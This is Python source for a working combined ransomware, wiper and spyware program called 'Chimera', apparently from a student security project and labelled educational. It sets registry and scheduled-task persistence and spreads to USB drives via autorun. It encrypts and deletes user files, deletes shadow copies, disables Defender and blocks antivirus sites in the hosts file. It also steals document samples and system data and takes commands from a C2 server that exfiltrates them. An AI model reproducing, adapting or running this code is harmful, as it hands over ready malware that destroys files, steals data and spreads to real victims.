"""
COMPLETE CHIMERA MALWARE
========================
Advanced ransomware, wiper, and spyware combination.
Includes all core malicious methods plus persistence and C2 communication.

⚠️ WARNING: For educational use only in isolated virtual environments!

Features:
- AES-256 File Encryption (Ransomware)
- System Corruption (Wiper) 
- Data Exfiltration (Spyware)
- Persistence Mechanisms
- C2 Communication with Command Handling
- USB Worm Propagation

Author: CADT Cyber Security Project
Date: November 28, 2025
"""

import os
import time
import socket
import json
import sys
import shutil
import subprocess
import winreg
import threading
from cryptography.fernet import Fernet

# === CONFIGURATION ===
MALWARE_NAME = "WindowsUpdate.exe"
C2_SERVER = "192.168.1.100"  # Change to your Kali Linux IP
C2_PORT = 4444
TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.xlsx', '.pptx']

class CompleteChimeraMalware:
    def __init__(self):
        self.current_path = os.path.abspath(sys.argv[0])
        self.user_home = os.path.expanduser("~")
        # Generate the key once and keep it safe
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.encrypted_count = 0
        self.stolen_data_count = 0
        self.keep_alive = True
        
    # ==========================================
    # PERSISTENCE MECHANISMS (FIXED)
    # ==========================================
    
    def establish_persistence(self):
        """Establish multiple persistence mechanisms"""
        print("[+] Establishing Persistence...")
        
        try:
            # 1. Registry Run Key
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, self.current_path)
            # FIX: Pass the 'key' object to CloseKey
            winreg.CloseKey(key)
            print("    [+] Registry persistence established")
        except Exception as e:
            print(f"    [-] Registry failed: {e}")

        try:
            # 2. Scheduled Task
            cmd = f'schtasks /create /tn "MicrosoftWindowsUpdate" /tr "{self.current_path}" /sc hourly /f'
            subprocess.call(cmd, shell=True)
            print("    [+] Scheduled task created")
        except Exception as e:
            print(f"    [-] Task failed: {e}")

    # ==========================================
    # PROPAGATION MECHANISMS  
    # ==========================================
    
    def propagate_usb_worm(self):
        """Spread via USB drives"""
        print("[+] Propagating via USB...")
        
        drives = ['%s:' % d for d in "DEFGHIJKLMNOPQRSTUVWXYZ"]
        infected_drives = 0
        
        for drive in drives:
            if os.path.exists(drive):
                try:
                    # Copy malware to USB
                    dest = os.path.join(drive, MALWARE_NAME)
                    shutil.copy2(self.current_path, dest)
                    
                    # Create autorun.inf
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, "w") as f:
                        f.write("[autorun]\n")
                        f.write("open=WindowsUpdate.exe\n")
                        f.write("action=Open folder to view files\n")
                        f.write("shell\\open=Open\n")
                        f.write("shell\\open\\Command=WindowsUpdate.exe\n")
                    
                    # Hide files
                    subprocess.call(f'attrib +h +s "{dest}"', shell=True)
                    subprocess.call(f'attrib +h +s "{autorun_path}"', shell=True)
                    
                    infected_drives += 1
                    print(f"    [+] Infected USB drive: {drive}")
                    
                except Exception:
                    continue
        
        print(f"[+] USB Propagation: Infected {infected_drives} drives")

    # ==========================================
    # CORE MALICIOUS METHOD 1: FILE ENCRYPTION (RANSOMWARE)
    # ==========================================
    
    def encrypt_file(self, file_path):
        """Encrypt a single file using AES-256"""
        try:
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            encrypted_data = self.cipher_suite.encrypt(original_data)
            
            encrypted_path = file_path + ".chimera_encrypted"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            os.remove(file_path)
            return True
        except Exception:
            return False

    def payload_ransomware(self):
        """Encrypt user files and demand ransom"""
        print("[+] Starting Ransomware Encryption...")
        
        # Reduced target scope for safer testing
        target_folders = [
            os.path.join(self.user_home, "Documents", "TestVictim"),  # Create this folder first for testing
            os.path.join(self.user_home, "Desktop")
        ]
        
        self.encrypted_count = 0
        
        for folder in target_folders:
            if os.path.exists(folder):
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                            file_path = os.path.join(root, file)
                            if self.encrypt_file(file_path):
                                self.encrypted_count += 1
                                if self.encrypted_count % 10 == 0:
                                    print(f"    [+] Encrypted {self.encrypted_count} files...")
        
        # Create ransom note
        self.create_ransom_note()
        print(f"[+] Ransomware: Encrypted {self.encrypted_count} files")
        return self.encrypted_count

    def create_ransom_note(self):
        """Create ransom note (FIXED KEY DISPLAY)"""
        # FIX: We now decode the key to string so you can copy it exactly
        key_string = self.encryption_key.decode()
        
        ransom_note = f"""
        ⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️
        
        What happened?
        ==============
        Your important files have been encrypted with military-grade AES-256 encryption.
        The following file types were affected: {', '.join(TARGET_EXTENSIONS)}
        
        Total files encrypted: {self.encrypted_count}
        
        How to recover your files?
        ==========================
        Use this KEY to decrypt your files (COPY EXACTLY):
        {key_string}
        
        Run command: python chimera_real.py --decrypt <KEY>
        
        ⚠️ WARNING:
        - Do NOT modify encrypted files
        - Do NOT use third-party recovery tools
        
        Contact: support@chimera.com (Educational Purpose Only)
        """
        
        # Create ransom note in multiple locations
        locations = [
            os.path.join(self.user_home, "Desktop", "READ_ME_FOR_DECRYPT.txt"),
            os.path.join(self.user_home, "Documents", "READ_ME_FOR_DECRYPT.txt")
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(ransom_note)
            except:
                pass

    # ==========================================
    # CORE MALICIOUS METHOD 2: SYSTEM CORRUPTION (WIPER)
    # ==========================================
    
    def payload_system_corruption(self):
        """Corrupt system files and configurations"""
        print("[+] Starting System Corruption...")
        
        corruption_actions = 0
        
        # 1. Corrupt hosts file
        try:
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            if os.path.exists(hosts_path):
                malicious_entries = [
                    "\n# CHIMERA MALWARE REDIRECTS - DO NOT REMOVE",
                    "127.0.0.1 microsoft.com",
                    "127.0.0.1 windowsupdate.microsoft.com",
                    "127.0.0.1 live.com",
                    "127.0.0.1 antivirus.com",
                    "127.0.0.1 avast.com",
                    "127.0.0.1 bitdefender.com",
                    "127.0.0.1 kaspersky.com",
                    "127.0.0.1 mcafee.com",
                    "127.0.0.1 symantec.com",
                    "127.0.0.1 norton.com",
                    "127.0.0.1 malwarebytes.com"
                ]
                
                with open(hosts_path, 'a') as f:
                    f.write('\n'.join(malicious_entries))
                
                corruption_actions += 1
                print("    [+] Corrupted hosts file - blocked security sites")
        except Exception as e:
            print(f"    [-] Hosts file corruption failed: {e}")

        # 2. Delete shadow copies
        try:
            result = subprocess.call("vssadmin delete shadows /all /quiet", shell=True)
            if result == 0:
                corruption_actions += 1
                print("    [+] Deleted volume shadow copies")
        except:
            pass

        # 3. Disable Windows Defender (simulated)
        try:
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"'
            ]
            
            for cmd in commands:
                subprocess.call(cmd, shell=True)
            
            corruption_actions += 1
            print("    [+] Disabled Windows Defender protections")
        except:
            pass

        # 4. Create corruption markers
        corruption_folders = [
            os.path.join(self.user_home, "AppData", "Local", "Temp"),
            os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome"),
            os.path.join(self.user_home, "AppData", "Local", "Microsoft", "Windows")
        ]
        
        for folder in corruption_folders:
            if os.path.exists(folder):
                try:
                    marker_file = os.path.join(folder, "CORRUPTED_BY_CHIMERA.txt")
                    with open(marker_file, 'w') as f:
                        f.write(f"System compromised by Chimera malware\nTime: {time.ctime()}\n")
                    corruption_actions += 1
                except:
                    pass

        print(f"[+] System Corruption: Completed {corruption_actions} destructive actions")
        return corruption_actions

    # ==========================================
    # CORE MALICIOUS METHOD 3: DATA EXFILTRATION (SPYWARE)
    # ==========================================
    
    def payload_data_exfiltration(self):
        """Steal and exfiltrate sensitive data"""
        print("[+] Starting Data Exfiltration...")
        
        stolen_data = {
            "system_info": self.collect_system_info(),
            "document_samples": self.steal_document_samples(),
            "network_info": self.collect_network_info(),
            "browser_data": self.find_browser_data(),
            "timestamp": time.time()
        }
        
        # Save locally
        self.save_stolen_data(stolen_data)
        
        print(f"[+] Data Exfiltration: Stole {self.stolen_data_count} document samples")
        return self.stolen_data_count

    def collect_system_info(self):
        """Collect comprehensive system information"""
        info = {
            "computer_name": socket.gethostname(),
            "username": os.getlogin(),
            "user_home": self.user_home,
            "windows_version": str(sys.getwindowsversion()),
            "current_time": time.ctime(),
            "malware_path": self.current_path,
            "processor_count": os.cpu_count()
        }
        return info

    def steal_document_samples(self):
        """Steal samples from documents"""
        samples = {}
        self.stolen_data_count = 0
        
        document_folders = [
            os.path.join(self.user_home, "Documents"),
            os.path.join(self.user_home, "Desktop"),
            os.path.join(self.user_home, "Downloads")
        ]
        
        for folder in document_folders:
            if os.path.exists(folder):
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        if any(file.endswith(ext) for ext in ['.txt', '.docx', '.pdf']):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    sample_data = f.read(200)  # First 200 bytes
                                
                                samples[file] = {
                                    "path": file_path,
                                    "size": os.path.getsize(file_path),
                                    "sample_hex": sample_data.hex(),
                                    "sample_text": sample_data[:100].decode('utf-8', errors='ignore')
                                }
                                
                                self.stolen_data_count += 1
                                
                                if self.stolen_data_count >= 15:  # Limit for demo
                                    return samples
                                    
                            except:
                                continue
        return samples

    def collect_network_info(self):
        """Collect network configuration"""
        info = {}
        try:
            info["hostname"] = socket.gethostname()
            info["local_ip"] = socket.gethostbyname(socket.gethostname())
            
            # Get network adapters info
            try:
                output = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
                info["ipconfig"] = output
            except:
                info["ipconfig"] = "Unable to retrieve"
                
        except Exception as e:
            info["error"] = str(e)
        
        return info

    def find_browser_data(self):
        """Locate browser data locations"""
        browsers = {}
        
        browser_paths = {
            "chrome": os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome"),
            "edge": os.path.join(self.user_home, "AppData", "Local", "Microsoft", "Edge"),
            "firefox": os.path.join(self.user_home, "AppData", "Roaming", "Mozilla", "Firefox")
        }
        
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                browsers[browser] = {
                    "path": path,
                    "exists": True,
                    "size": self.get_folder_size(path)
                }
            else:
                browsers[browser] = {"exists": False}
        
        return browsers

    def get_folder_size(self, folder):
        """Calculate folder size"""
        try:
            total_size = 0
            for dirpath, dirnames, filenames in os.walk(folder):
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    try:
                        total_size += os.path.getsize(filepath)
                    except:
                        pass
            return total_size
        except:
            return 0

    def save_stolen_data(self, stolen_data):
        """Save stolen data to local file"""
        try:
            exfil_file = os.path.join(os.getcwd(), "chimera_exfiltrated_data.json")
            with open(exfil_file, 'w', encoding='utf-8') as f:
                json.dump(stolen_data, f, indent=4, ensure_ascii=False)
            print("    [+] Saved stolen data locally")
        except Exception as e:
            print(f"    [-] Failed to save stolen data: {e}")

    # ==========================================
    # C2 COMMUNICATION WITH COMMAND HANDLING
    # ==========================================
    
    def handle_c2_communication(self):
        """Enhanced C2 communication with command reception"""
        print("[+] Starting C2 Communication Handler...")
        
        while self.keep_alive:
            try:
                # Create socket connection
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30.0)
                s.connect((C2_SERVER, C2_PORT))
                
                # Send handshake
                handshake = {
                    "type": "handshake",
                    "bot_id": f"{socket.gethostname()}_{os.getlogin()}",
                    "computer_name": socket.gethostname(),
                    "username": os.getlogin(),
                    "malware_version": "Chimera_Complete_v2.0",
                    "timestamp": time.time(),
                    "status": "ACTIVE"
                }
                
                s.send(json.dumps(handshake).encode())
                print("    [+] Connected to C2 server, waiting for commands...")
                
                # Listen for commands
                while self.keep_alive:
                    try:
                        data = s.recv(4096).decode()
                        if not data:
                            break
                            
                        command_data = json.loads(data)
                        command = command_data.get('command', '')
                        parameters = command_data.get('parameters', '')
                        
                        print(f"    [+] Received command: {command} {parameters}")
                        
                        # Execute command
                        result = self.execute_command(command, parameters)
                        
                        # Send result back
                        response = {
                            "type": "command_result",
                            "command": command,
                            "result": result,
                            "timestamp": time.time()
                        }
                        
                        s.send(json.dumps(response).encode())
                        
                        # Send exfiltrated data if available
                        if command == "exfiltrate":
                            stolen_data = self.collect_exfiltration_data()
                            exfil_message = {
                                "type": "exfiltration",
                                "data": stolen_data,
                                "file_count": self.encrypted_count,
                                "stolen_samples": self.stolen_data_count
                            }
                            s.send(json.dumps(exfil_message).encode())
                            
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"    [-] Command handling error: {e}")
                        break
                
                s.close()
                
            except Exception as e:
                print(f"    [-] C2 Connection failed, retrying in 30 seconds: {e}")
                time.sleep(30)

    def execute_command(self, command, parameters):
        """Execute commands received from C2 server"""
        try:
            if command == "encrypt_files":
                result = self.payload_ransomware()
                return f"Encrypted {result} files"
                
            elif command == "corrupt_system":
                result = self.payload_system_corruption()
                return f"Completed {result} corruption actions"
                
            elif command == "exfiltrate":
                result = self.payload_data_exfiltration()
                return f"Exfiltrated {result} document samples"
                
            elif command == "system_info":
                info = self.collect_system_info()
                return f"System: {info['computer_name']} - User: {info['username']}"
                
            elif command == "status":
                return "Bot active and operational"
                
            elif command == "propagate":
                result = self.propagate_usb_worm()
                return f"Infected {result} USB drives"
                
            elif command == "shutdown":
                self.keep_alive = False
                return "Shutting down malware"
            elif command == "auto_execute":
                # Start full attack sequence (persistence, propagation, payloads)
                try:
                    threading.Thread(target=self._auto_execute_all, daemon=True).start()
                    return "Auto-execution started"
                except Exception as e:
                    return f"Failed to start auto-execution: {e}"
                
            else:
                return f"Unknown command: {command}"
                
        except Exception as e:
            return f"Command execution failed: {e}"

    def collect_exfiltration_data(self):
        """Collect data for exfiltration"""
        return {
            "system_info": self.collect_system_info(),
            "document_samples": self.steal_document_samples(),
            "network_info": self.collect_network_info(),
            "file_count": self.encrypted_count,
            "timestamp": time.time()
        }

    def _auto_execute_all(self):
        """
        Internal helper to run the full attack sequence without starting a second C2 handler.
        This runs persistence, propagation, and the three core payloads (encryption, corruption, exfiltration)
        concurrently in background threads.
        """
        try:
            print("[+] Auto-execution: Establishing persistence...")
            try:
                self.establish_persistence()
            except Exception as e:
                print(f"    [-] Persistence error during auto_execute: {e}")

            print("[+] Auto-execution: Propagating via USB...")
            try:
                self.propagate_usb_worm()
            except Exception as e:
                print(f"    [-] Propagation error during auto_execute: {e}")

            print("[+] Auto-execution: Launching core payloads...")
            threads = []
            threads.append(threading.Thread(target=self.payload_ransomware, daemon=True))
            threads.append(threading.Thread(target=self.payload_system_corruption, daemon=True))
            threads.append(threading.Thread(target=self.payload_data_exfiltration, daemon=True))

            for t in threads:
                t.start()
                time.sleep(0.2)

            # Optionally wait a short time for initial activity
            for t in threads:
                t.join(timeout=60)

            # Create attack report after initial payloads
            try:
                self.create_attack_report()
                print("[+] Auto-execution: Initial payloads complete and report created")
            except Exception as e:
                print(f"    [-] Failed to create attack report: {e}")

            return True
        except Exception as e:
            print(f"[!] Auto-execution encountered an error: {e}")
            return False

    # ==========================================
    # MAIN EXECUTION FLOW
    # ==========================================
    
    def execute_malware(self):
        """Main malware execution sequence"""
        print("""
        ╔═══════════════════════════════════════════════╗
        ║              CHIMERA MALWARE                  ║
        ║         Complete Attack Sequence              ║
        ║         Educational Purpose Only              ║
        ╚═══════════════════════════════════════════════╝
        """)
        
        # Phase 1: Persistence
        self.establish_persistence()
        time.sleep(1)
        
        # Phase 2: Propagation
        self.propagate_usb_worm()
        time.sleep(1)
        
        # Phase 3: Core Malicious Payloads in parallel
        print("\n[+] Executing Core Malicious Payloads...")
        
        threads = []
        
        encryption_thread = threading.Thread(target=self.payload_ransomware)
        corruption_thread = threading.Thread(target=self.payload_system_corruption)
        exfiltration_thread = threading.Thread(target=self.payload_data_exfiltration)
        c2_thread = threading.Thread(target=self.handle_c2_communication)
        
        threads.extend([encryption_thread, corruption_thread, exfiltration_thread, c2_thread])
        
        # Start all threads
        for thread in threads:
            thread.daemon = True
            thread.start()
            time.sleep(0.5)
        
        # Wait for initial payload completion
        for i, thread in enumerate(threads[:3]):  # First 3 are payload threads
            thread.join(timeout=60)
        
        # Create final report
        self.create_attack_report()
        
        print("""
        ╔═══════════════════════════════════════════════╗
        ║             INITIAL ATTACK COMPLETE           ║
        ║         C2 Communication Active               ║
        ║         Waiting for remote commands...        ║
        ╚═══════════════════════════════════════════════╝
        """)
        
        # Keep C2 thread alive
        try:
            while self.keep_alive:
                time.sleep(1)
        except KeyboardInterrupt:
            self.keep_alive = False
            print("\n[!] Malware shutdown initiated...")

    def create_attack_report(self):
        """Create detailed attack report (FIXED KEY STORAGE)"""
        # FIX: Decode the key to a standard string
        key_str = self.encryption_key.decode()
        
        report = f"""
        CHIMERA MALWARE - ATTACK REPORT
        ================================
        Timestamp: {time.ctime()}
        Target: {socket.gethostname()} - {os.getlogin()}
        
        ATTACK METRICS:
        - Files Encrypted: {self.encrypted_count}
        - Documents Stolen: {self.stolen_data_count}
        - Persistence Established: Yes
        - USB Propagation: Active
        - C2 Communication: ACTIVE
        
        DECRYPTION KEY (SAVE THIS SAFE - COPY EXACTLY):
        {key_str}
        
        STATUS: Waiting for C2 commands...
        
        REMINDER: This is for educational purposes only!
        """
        
        report_file = os.path.join(os.getcwd(), "chimera_attack_report.txt")
        with open(report_file, 'w') as f:
            f.write(report)
        print(f"[+] Attack report saved: {report_file}")

# ==========================================
# DECRYPTION TOOL (FIXED)
# ==========================================

class ChimeraDecryptor:
    """Tool to decrypt files encrypted by Chimera malware (FIXED)"""
    
    def __init__(self, encryption_key):
        # The key passed here must be the full Byte string
        self.cipher_suite = Fernet(encryption_key)
    
    def decrypt_file(self, encrypted_path):
        """Decrypt a single file (FIXED)"""
        try:
            # Remove .chimera_encrypted extension
            original_path = encrypted_path.replace('.chimera_encrypted', '')
            
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            os.remove(encrypted_path)
            print(f"[+] Decrypted: {original_path}")
            return True
            
        except Exception as e:
            print(f"[-] Failed to decrypt {encrypted_path}: {e}")
            return False
    
    def decrypt_all_files(self, start_folder):
        """Decrypt all encrypted files in a folder (FIXED)"""
        decrypted_count = 0
        
        for root, dirs, files in os.walk(start_folder):
            for file in files:
                if file.endswith('.chimera_encrypted'):
                    file_path = os.path.join(root, file)
                    if self.decrypt_file(file_path):
                        decrypted_count += 1
        
        print(f"[+] Successfully decrypted {decrypted_count} files")
        return decrypted_count

# ==========================================
# MAIN EXECUTION
# ==========================================

if __name__ == "__main__":
    # Check if we're in decryption mode
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        if len(sys.argv) > 2:
            # FIX: We take the string from command line and encode it to bytes
            # The user must provide the FULL key string from the report/note
            key_str = sys.argv[2]
            print(f"[*] Attempting decryption with key: {key_str}")
            
            try:
                key_bytes = key_str.encode()
                decryptor = ChimeraDecryptor(key_bytes)
                decryptor.decrypt_all_files(os.path.expanduser("~"))
            except Exception as e:
                print(f"[!] Error initializing decryptor. Key might be wrong format.\nError: {e}")
        else:
            print("Usage: python chimera_real.py --decrypt <FULL_KEY_FROM_NOTE>")
            print("Encryption key can be found in chimera_attack_report.txt or ransom note")
    else:
        # Run the malware
        malware = CompleteChimeraMalware()
        malware.execute_malware()